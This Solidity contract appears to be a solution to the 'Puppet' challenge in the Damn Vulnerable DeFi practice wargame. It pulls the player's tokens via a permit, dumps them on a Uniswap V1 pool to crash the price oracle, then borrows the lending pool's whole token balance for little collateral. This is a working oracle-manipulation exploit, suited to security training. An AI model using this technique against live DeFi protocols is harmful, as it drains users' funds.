// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {PuppetPool} from "../../src/puppet/PuppetPool.sol";
import {IUniswapV1Exchange} from "../../src/puppet/IUniswapV1Exchange.sol";
import {IUniswapV1Factory} from "../../src/puppet/IUniswapV1Factory.sol";

contract Attacker {
    uint256 constant POOL_INITIAL_TOKEN_BALANCE = 100_000e18;
    uint256 constant PLAYER_INITIAL_ETH_BALANCE = 25e18;

    PuppetPool public pool;
    DamnValuableToken public token;
    IUniswapV1Exchange public uniswapV1Exchange;
    address public player;
    address public recovery;
    uint256 public playerPrivateKey;

    constructor (
        PuppetPool _pool,
        uint256 amount,
        address recipient,
        address _player,
        uint256 _playerPrivateKey,
        DamnValuableToken _token,
        IUniswapV1Exchange _uniswapV1Exchange,
        uint256 deadline,
        uint8 v, bytes32 r, bytes32 s
    ) payable {
        pool = _pool;
        recovery = recipient;
        playerPrivateKey = _playerPrivateKey;
        token = _token;
        player = _player;
        uniswapV1Exchange = _uniswapV1Exchange;

        // get tokens from player
        token.permit(player, address(this), amount, deadline, v, r, s);
        token.transferFrom(player, address(this), amount);
        
        // swap them on uniswap
        token.approve(address(uniswapV1Exchange), amount);
        uniswapV1Exchange.tokenToEthSwapInput(amount, 1,deadline);
        // send to recovery
        pool.borrow{value: PLAYER_INITIAL_ETH_BALANCE}(POOL_INITIAL_TOKEN_BALANCE, address(recovery));
    }

    receive() external payable {

    }
}
